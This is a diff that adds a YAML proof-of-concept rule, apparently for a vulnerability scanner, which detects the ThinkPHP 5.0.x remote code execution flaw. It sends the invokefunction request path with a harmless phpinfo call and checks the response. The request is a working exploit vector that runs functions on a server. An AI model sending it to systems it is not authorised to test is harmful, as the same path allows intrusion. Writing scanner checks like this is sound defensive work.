@@ -1,0 +1,10 @@
+name: poc-yaml-thinkphp5.0.x-rce
+rules:
+  - method: GET
+    path: "/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1"
+    expression: |
+      response.status==200 && response.body.bcontains(b'Configure')
+
+detail:
+  author: xxx
+  links: https://www.jianshu.com/p/8cb479be7ec9
